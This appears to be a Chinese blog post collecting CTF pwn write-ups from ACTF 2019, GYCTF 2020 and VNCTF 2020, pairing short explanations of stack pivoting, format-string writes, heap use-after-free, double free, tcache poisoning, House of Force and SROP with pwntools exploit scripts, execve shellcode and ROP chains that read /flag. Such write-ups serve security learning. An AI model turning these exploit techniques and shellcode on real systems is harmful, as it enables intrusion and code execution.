---
title: 近期进阶 Pwn 合集
date: 2020-03-01 14:10:54
tags:
  - 整数溢出
  - 栈漏洞
  - fsb
  - 堆漏洞
categories:
  - 二进制安全
---

难题都没有做出来。题目来自 ACTF 2019、GYCTF 2019、VNCTF 2020。

<!--more-->

## ACTF 2019

### babystack

只能溢出 0x10 字节，因此使用栈迁移。这题的迁移比较简单，题目给了栈地址，并且只需要迁移一次。

```python
leave = 0x400a18
pop_rdi = 0x400ad3
sla('?\n',str(0xe0))
ru('saved at 0x')
addr = int(ru('\n'),16)
# ebp2,payload,padding,fake ebp,leave_ret
payload = flat('a'*8,pop_rdi,elf.got['puts'],elf.plt['puts'],0x4008f6).ljust(0xd0,'a') + flat(addr,leave)
sa('?\n',payload)

ru('~\n')
puts = uu64(r(6))
system,binsh = ret2libc(puts,'puts')

sla('?\n',str(0xe0))
ru('saved at 0x')
addr = int(ru('\n'),16)
payload = flat('a'*8,pop_rdi,binsh,system).ljust(0xd0,'a') + flat(addr,leave)
sa('?\n',payload)
```

### 一个复读机

很容易发现格式化字符串漏洞，首先测出偏移为 7 处是返回地址，我们往这里写地址即可。写什么地址呢？程序没有开启 NX 保护，因此可以先布置 shellcode，然后写 shellcode 地址。

但是我们只能在栈上布置 shellcode，而栈地址以 `0xff` 开头，如果直接写入 4 字节地址，那么需要输出非常长的字符串才行，非常耗时。因此我们尝试分 2 次写入，每次 2 字节。

从 [这里](https://www.csuaurora.org/ACTF_2019/) 盗取了一张不错的图示：

```
To illustrate why we write payload in that way
This is an example stack layout, supposing the leak address is 0xffffc970

      *---------------*
c930  |  0xffffc970   |  (addr of format string)
      *---------------*
c934  |  xxxxxxxxxx   |  1$ (first parameter of printf)
      *---------------*
           .....
      *---------------*
c94c  |  return addr  |  7$
      *---------------*
           .....
      *---------------*
c970  |  0xffffc94c   | 16$ (start addr of read buffer)
      *---------------*
c974  |    "%516"     | 17$ (51628 = 0xc9b0 - 4)
      *---------------*
c978  |    "28d%"     | 18$
      *---------------*
c97c  |    "16$h"     | 19$
      *---------------*
c980  |    "naaa"     | 20$
      *---------------*
c984  |  0xffffc94e   | 21$
      *---------------*
c988  |    "%138"     | 22$ (13869 = 0xffff - 0xc9b0 - 4 - 3)
      *---------------*
c98c  |    "69d%"     | 23$
      *---------------*
c990  |    "21$h"     | 24$
      *---------------*
c994  |    "naaa"     | 25$
      *---------------*
c998  |    "aaaa"     | 26$
      *---------------*
           .....
      *---------------*
c9b0  |               |
      |   shellcode   |
      |               |
      *---------------*
```

首先要写的目标是 `0xffffc94c` 也就是返回地址所在位置，向这个位置先写入 `0xc9b0` 也就是后面我们计算出的 shellcode 地址的低 4 位，这里 `-4` 是因为前面已经输出 `0xffffc94c` 这 4 字节了。因此第一步 payload 为 `%51628d%16$hnaaa`，最后 `aaa` 是为了凑到 4 字节对齐，`hn` 是以 2 字节写入，`16` 的偏移可以自动化测出。

同理，第二步要写入的目标是 `0xffffc94e`，写入数据是 shellcode 高 4 位减去低 4 位 `0xffff-0xc9b0`，随后 `-4` 是因为前面已经输出 `0xffffc94e` 这 4 字节，`-3` 是因为第一步填充的 `aaa` 占 3 字节。第二步 payload 即 `%13869d%21$hnaaa`。

两步的 payload 合并后长为 0x28 字节，在后面放上 shellcode，此时即确定了 shellcode 的地址。触发漏洞就能 getshell 了。

```python
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

sla('Exit\n','1')
buf = int(r(8),16)
sc = buf+0x28
ret = buf-0x24

payload = p32(ret)+'%'+str((sc&0xffff)-4)+'d%16$hnaaa'
payload += p32(ret+2)+'%'+str(((sc>>16)&0xffff)-(sc&0xffff)-7)+'d%21$hnaaa'
payload += shellcode

s(payload)
sla('Exit\n','2')
```

### another_repeater

题目在输入长度时可以整数溢出，还给了 `buf` 的地址。那么直接输入 `-1`，然后 ret2shellcode 即可。

```python
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

sla('peat?\n','-1')
addr = int(r(8),16)

payload = shellcode.ljust(0x41b+4,'a')+p32(addr)
sa('\n',payload)
```

### babyheap

uaf 覆盖打印函数为 `system`，内容为 `/bin/sh`。

```python
def add(size,content='a'):
    sla(':','1')
    sla('size: \n',str(size))
    sa('content: \n',content)

def free(index):
    sla(':','2')
    sla('index: \n',str(index))

def show(index):
    sla(':','3')
    sla('index: \n',str(index))

add(0x20) # 0
add(0x20) # 1
free(0)
free(1)

binsh = 0x602010
add(0x10,flat(binsh,elf.plt['system'])) # 2
show(0)
```

### message

利用 double free 欺骗 malloc 分配一个位于 bss 段的 chunk，使得我们可以控制全局数组，从而修改 0 号堆块的内容。然后先泄露 libc 再劫持 `__free_hook` 到 `system` 即可。需要注意 fastbin 的大小检查。

```python
def add(size,content='a'):
    sla(':','1')
    sla(':\n',str(size))
    sa(':\n',content)

def free(index):
    sla(':','2')
    sla(':\n',str(index))

def edit(index,content):
    sla(':','3')
    sla(':\n',str(index))
    sa(':\n',content)

def show(index):
    sla(':','4')
    sla(':\n',str(index))

add(0x50) # 0
add(0x40) # 1
add(0x40) # 2
free(1)
free(2)
free(1)

fake = 0x602060-0x8
add(0x40,p64(fake)) # 3 <-> 1
add(0x40) # 4 <-> 2
add(0x40) # 5 <-> 1
add(0x40,p64(elf.got['puts'])) # 6 <-> fake
show(0)
ru(':')
puts = uu64(r(6))

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
free_hook = base + libc.dump('__free_hook')

edit(6,p64(free_hook))
edit(0,p64(system))
add(0x8,'/bin/sh\x00') # 7
free(7)
```

## GYCTF 2020

### borrowstack

用 `leave_ret` 栈迁移到 bss 段，需要注意的是栈从高地址向低地址生长，需要留足够的 `offset` 确保迁移之后填的 payload 不会覆盖到下面的 got 表。我直接把 payload 长度加起来留了一些余量作为 `offset`，实际上这里的 `offset` 甚至可以爆破出来。

```python
leave_ret = 0x400699
bank = 0x601080
pop_rdi = 0x400703
offset = 0xa0

payload = flat('a'*0x60,bank+offset,leave_ret)
sa('want\n',payload)
payload = flat('a'*offset,bank+offset,pop_rdi,elf.got['puts'],elf.plt['puts'],elf.sym['main'])
sa('now!\n',payload)

base = uu64(r(6)) - libc.sym['puts']
leak('base',base)
one = base + 0x4526a

payload = flat('a'*0x60,'a'*8,one)
sa('want\n',payload)
sa('now!\n','a')
```

### some_thing_exceting

每次申请创建三个堆块，其中一个是结构体指针两个是字符串。而释放时没有置 NULL，利用 double free 就可以修改其中一个字符串 chunk 的 fd 指针，指向已经在 bss 段上的 flag。不过对应位置的伪造 `size` 字段为 `0x60`，因此为了通过 fastbin 检查需要使用 0x50 的字符串 chunk。

```python
flag = 0x6020a8
add(0x60,0x50)
add(0x60,0x50)
add(0x60,0x50)
free(0)
free(1)
free(0)
add(0x50,0x50,p64(flag-0x10))
add(0x50,0x50)
show(1)
```

### some_thing_interesting

和上题不同的是没有 flag 在 bss 段了，但是多出了一个检查 code 的选项，该函数内存在格式化字符串漏洞。测出偏移为 17，泄露 libc。

随后，由于本题的 `edit` 函数是可以用的，我们不需要 double free 了，直接 uaf 就可以修改 `__malloc_hook` 为 `one_gadget` 了。

```python
code = 'OreOOrereOOreO'
sla(':',code+'%17$p')
sla(':','0')
ru(code)
base = int(ru('\n'),16) - 0x20830
leak('base',base)

add(0x60,0x60)
add(0x60,0x60)
free(1)
free(2)
edit(1,p64(base+libc.sym['__malloc_hook']-0x23))
add(0x60,0x60)
add(0x60,0x60)
edit(4,'a'*0x13+p64(base+0xf1147))

sla(':','1')
sla(':',str(0x60))
```

> 两道 something 似乎改编自 ACTF2020 的两道 SCP Foundation。

### signin

程序分配的块大小固定为 0x70，最多申请 9 个；`edit` 功能只能用一次，不过并没有检查 chunk 是否是 free 的；`delete` 检查了 chunk 是否为 free，并且释放之后将 chunk 对应的 `flag` 标记为 free，因此无法 double free，不过指针依然没有置 NULL。

此外还存在后门函数，先 `calloc(1,0x70)`，然后如果全局变量 `ptr` 不为空就能 getshell。题目环境为 Ubuntu 18，那么思路就是利用 tcache 机制。先填满 tcache，随后对 tcache 中第一个 chunk 投毒，即修改 `fd` 指向 `ptr` 上方的 fake chunk，然后申请出一块 tcache chunk，此时 fake chunk 就会进入 tcache 中。再申请一次即可 getshell。

```python
for i in range(8):
    add(i)
for i in range(8):
    free(i)

dbg()
edit(7,p64(0x4040c0-0x10))
add(8)
dbg()
sla('?','6')
dbg()
```

### force

程序没有对申请的大小进行检查，结合题目名可以想到 House of Force。先申请一个很大的 chunk 紧挨着 libc，可以泄露出 libc。这里的偏移是通过 gdb 调试得到的，将题目给出的地址和 `libc_base` 进行 `distance` 即可。随后修改 top chunk 大小同时泄露堆地址。这样 top chunk 地址也得到了。

接下来，我使用 `pwngdb` 工具，调试的时候先查看 `heapbase`，然后把这个地址作为参数传给 `force` 命令，即可得到 `nb=-48`，从而算出 `evil_size` 为 `malloc_hook-top-0x30`。申请一个 `evil_size` 大小的 chunk，然后再申请就能得到 `__malloc_hook` 附近的 chunk，由于 `one_gadget` 条件不满足，这里借用了 `realloc` 去覆盖 `__malloc_hook`。

```python
distance = 0x5b2010
base = add(0x20000)-distance
leak('base',base)

heap = add(0x10,'\x00'*0x18+p64(0xffffffffffffffff))-0x10
leak('heap',heap)
top = heap+0x20

malloc_hook = base+libc.sym['__malloc_hook']
one = base+0x4526a
realloc = base+libc.sym['realloc']

# force heapbase
evil = malloc_hook-top-0x30
add(evil)
payload = flat('a'*8,one,realloc+4)
add(len(payload),payload)

sla('puts\n','1')
sla('size\n',str(0x10))
```

需要注意远程的 chunk 到 libc 偏移量与本地不同，但是不能通过调试得到。此时可以爆破该偏移，又由于 ASLR 不改变低 12 位，只需要步长为 0x1000。

### bf_note

本题关键在于读取 title 长度时对长度进行了限制，但是后面用的时候依然用的是第一次输入的没有经过限制的长度变量。此外，在读入 description 和 postscript 时存在栈溢出。

接下来的步骤对我而言属于新姿势，而 [原 writeup](https://b0ldfrev.top/2020/02/24/BFnote/) 写得挺详细了，建议参考。

### document

本题存在明显的 uaf 漏洞，关键在于通过逆向弄清结构体的结构：

```
     -----------------------
    | prev_size | size=0x21 |
     -----------------------
--  | ptr       | sex=1     |
|    -----------------------
|   | prev_size | size=0x91 |
|    -----------------------
--> | name      | sex=1     |
     -----------------------
    |                       |
    | information           |
    |                       |
     -----------------------
```

那么我们利用的思路就很简单了，首先由于 `information` 所在的 chunk 固定申请 0x80，也就是实际 0x90 大小，我们可以释放掉一块来泄露 libc。然后新申请的 0x20 堆块都会从从释放的这块中切割，这样只需要在 `ptr` 里写入 `free_hook-0x10`，那么在编辑 `information` 时，`free_hook` 就落在了图中的 `information` 位置，我们写上 `system` 即可。

```python
add('/bin/sh\x00') # 0
add() # 1
add() # 2
free(1)
show(1)
ru('\n')
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
free_hook = base+libc.sym['__free_hook']
system = base+libc.sym['system']

add() # 3
add() # 4
edit(1,flat(0,0x21,free_hook-0x10,1)+p64(0)*10)
edit(4,p64(system)+p64(1)+p64(0)*12)
free(0)
```

## VNCTF 2020

第一次见到堆题比栈题解答人数还多的比赛。

### simpleHeap

编辑时存在 off by one，可以修改下一个 chunk 的大小后令其进入 unsorted bin 泄露 libc。然后修改 `malloc_hook` 为 `one_gadget`，注意需要通过 `realloc` 调整 `rsp` 来满足 `one_gadget` 条件。

```python
add(0x18) # 0
add(0x68) # 1
add(0x68) # 2
add(0x18) # 3

edit(0,'a'*0x18+'\xe1')
free(1)
add(0x68) # 1
show(2)
base = uu64(r(6))-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
malloc_hook = base+libc.sym['__malloc_hook']

add(0x60) # 4 <-> 2
free(3)
free(2)
edit(4,p64(malloc_hook-0x23)+'\n')
add(0x60)
add(0x60,flat('a'*11,base+0x4526a,base+libc.sym['realloc']+13))
sla(':',str(_add))
sla('?',str(0x18))
```

### easyTHeap

`free` 时指针未置 NULL。先利用 tcache double free 泄露堆地址，随后 tcache 投毒拿到 `tcache_perthread_struct`，修改 `count` 令 tcache 全被填满，再次 `free` 时就会进入 unsorted bin 泄露 libc。接下来依然是覆盖 `malloc_hook` 为 `one_gadget` 以及通过 `realloc` 调整 `rsp`，不过由于环境是 2.27，`one_gadget`、偏移量等等都会会有所不同，unsorted bin 泄露的地址也变成了 `main_arena+96` 而非 `+88`。

```python
add(0x80) # 0
add(0x80) # 1
free(0)
free(0)
show(0)
heap = uu64(r(6))-0x260
leak('heap',heap)

tps = heap+0x10
add(0x80) # 2 <-> 0
edit(2,p64(tps))

add(0x80) # 3 <-> 1
add(0x80) # 4 <-> tps
edit(4,'\x07'*8+'\x00'*0x70+p64(tps+0x78))
free(0)
show(0)
base = uu64(r(6))-0x60-libc.sym['__malloc_hook']-0x10
leak('base',base)
one = base+0x10a38c
malloc_hook = base+libc.sym['__malloc_hook']

edit(4,'\x07'*8+'\x00'*0x70+p64(malloc_hook-0x8))
add(0x80) # 5
edit(5,flat(one,base+libc.sym['realloc']+4))
sla(':',str(_add))
sla('?',str(0x10))
```

### warmup

只能溢出 0x10 字节，但是上一个栈帧的 `buf` 空间较大且可控，因此可以多 ret 一次回到上一个栈帧的 `buf` 里构造 ROP 链。此外，程序开启了 seccomp 沙箱禁止 `execve`，因此我们只能构造 ORW 读 flag。幸运的是题目直接给了 puts 地址，可以得到 libc 地址从而使用 libc 的 gadgets，而 ORW 使用的缓冲区也可以利用 libc 的 rw 段。

```python
ru('0x')
puts = int(ru('\n'),16)
base = puts-libc.sym['puts']
leak('base',base)
pop_rdi = base+0x21102
pop2 = base+0x1150c9 # rdx,rsi
ret = base+0x937
open = base+libc.sym['open']
read = base+libc.sym['read']
buf = base+libc.sym['_IO_2_1_stderr_']

chain = [
    # read(0,buf,8)
    pop_rdi,0,pop2,8,buf,read,
    # open(buf,0,0)
    pop_rdi,buf,pop2,0,0,open,
    # read(3,buf,0x100)
    pop_rdi,3,pop2,0x100,buf,read,
    # puts(buf)
    pop_rdi,buf,puts
]
sa('thing:',flat(chain))
payload = flat('a'*0x70,'a'*8,ret)
sa('name?',payload)
s('/flag\x00\x00\x00')
```

### babybabypwn_1

看到程序主动调用 `syscall(15,&buf)` 可知是 SROP，我们需要在 `buf` 里放伪造的 Sigreturn Frame，然后程序就会调用 `rt_sigreturn` 恢复我们伪造的 frame。同样开启了沙箱，依然是构造 ORW 读 flag。

这里在使用 `pwnlib.rop.srop` 模块时，用 `SigreturnFrame` 构造时出现了一些问题，暂时还不清楚原因，使用了手动构造 frame 的办法。

```python
ru('0x')
puts = int(ru('\n'),16)
base = puts-libc.sym['puts']
leak('base',base)
pop_rdi = base+0x21102
pop2 = base+0x1150c9
syscall = base+libc.sym['syscall']
open = base+libc.sym['open']
read = base+libc.sym['read']
buf = base+0x3c6500

frame  = p64(0) * 12
frame += p64(0)         # rdi
frame += p64(0)         # rsi
frame += p64(0)         # rbp
frame += p64(0)         # rbx
frame += p64(buf-0x10)  # rdx
frame += p64(0)         # rax
frame += p64(0x100)     # rcx
frame += p64(buf)       # rsp
frame += p64(syscall)   # rip
frame += p64(0)         # eflags
frame += p64(0x33)      # cs/fs/gs
frame += p64(0)*7
sa('message:',frame)

chain = [
    '/flag\x00\x00\x00',0,
    # open(buf-0x10,0,0)
    pop_rdi,buf-0x10,pop2,0,0,open,
    # read(3,buf+0x100,0x100)
    pop_rdi,3,pop2,0x100,buf+0x100,read,
    # puts(buf+0x100)
    pop_rdi,buf+0x100,puts
]
s(flat(chain))
```

更新：参考 AiDai 师傅的方法，可以自动构造 frame，并且不需要系统调用：

```python
ru('0x')
puts = int(ru('\n'),16)
base = puts-libc.sym['puts']
leak('base',base)
pop_rdi = base+0x21102
pop2 = base+0x1150c9
open = base+libc.sym['open']
read = base+libc.sym['read']
buf = base+libc.bss()

frame = SigreturnFrame()
frame.rdi = 0
frame.rsi = buf
frame.rdx = 0x100
frame.rsp = buf
frame.rip = read
sa('message:',str(frame)[8:])

chain = [
    # read(0,buf,0x100)
    pop_rdi,0,pop2,0x100,buf,read,
    # open(buf,0,0)
    pop_rdi,buf,pop2,0,0,open,
    # read(3,buf,0x100)
    pop_rdi,3,pop2,0x100,buf,read,
    # puts(buf)
    pop_rdi,buf,puts
]
s(flat(chain))
s('/flag\x00')
```
